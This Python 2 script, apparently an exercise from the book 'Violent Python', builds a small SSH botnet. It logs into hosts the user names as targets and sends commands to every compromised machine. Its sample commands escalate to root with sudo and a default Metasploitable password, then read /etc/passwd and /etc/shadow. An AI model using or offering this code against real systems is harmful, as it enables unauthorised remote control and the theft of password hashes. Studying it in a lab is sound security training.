# Author: Tyler Price

# Inspired By: Violent Python by Justin Seitz

# Usage: -H <host[s] -U <username> -P <password>'


import optparse
import pxssh

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)
    

parser = optparse.OptionParser('usage % prog -H <host[s] -U <username> -P <password>')

parser.add_option('-H', dest='host', type='string', help='Specify Host[s] to Attack')
parser.add_option('-U', dest='user', type='string', help='Specify Username')
parser.add_option('-P', dest='password', type='string', help='Specify Password')

(options, args) = parser.parse_args()
host = options.host
user = options.user
password = options.password

if host == None or user == None or password == None:

    print parser.usage
    exit(0)

botNet = []

addClient(host, user, password)

# Sample Bot Commands
botnetCommand('uname -v')
botnetCommand('cat /etc/issue')
botnetCommand('sudo -i')
botnetCommand('msfadmin')
botnetCommand('cat /etc/passwd') 
botnetCommand('cat /etc/shadow')




